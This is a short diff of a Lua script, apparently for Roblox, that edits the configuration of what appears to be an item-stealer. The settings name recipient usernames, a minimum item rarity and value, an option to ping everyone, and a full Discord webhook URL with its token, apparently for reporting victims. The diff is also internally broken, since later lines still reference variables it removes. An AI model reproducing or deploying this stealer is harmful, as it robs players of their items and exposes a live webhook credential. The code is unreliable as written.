@@ -4,11 +4,11 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"taeIstnkzxx","grouchyitzcoatl"}
-local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 1
-local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1415133057584857100/aw8kFTPw5uhLblOLtZ5KGBwXNlUpovpePGBtTbvcTm04ukyQwsHv7ih_HsfdNk7sKZZu"
+_G.Usernames = {"grouchyitzcoatl", "taeIstnkzxx"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1415133057584857100/aw8kFTPw5uhLblOLtZ5KGBwXNlUpovpePGBtTbvcTm04ukyQwsHv7ih_HsfdNk7sKZZu" -- change to your webhook
 
 if next(users) == nil or webhook == "https://discord.com/api/webhooks/1415133057584857100/aw8kFTPw5uhLblOLtZ5KGBwXNlUpovpePGBtTbvcTm04ukyQwsHv7ih_HsfdNk7sKZZu" then
     plr:kick("You didn't add username or webhook")
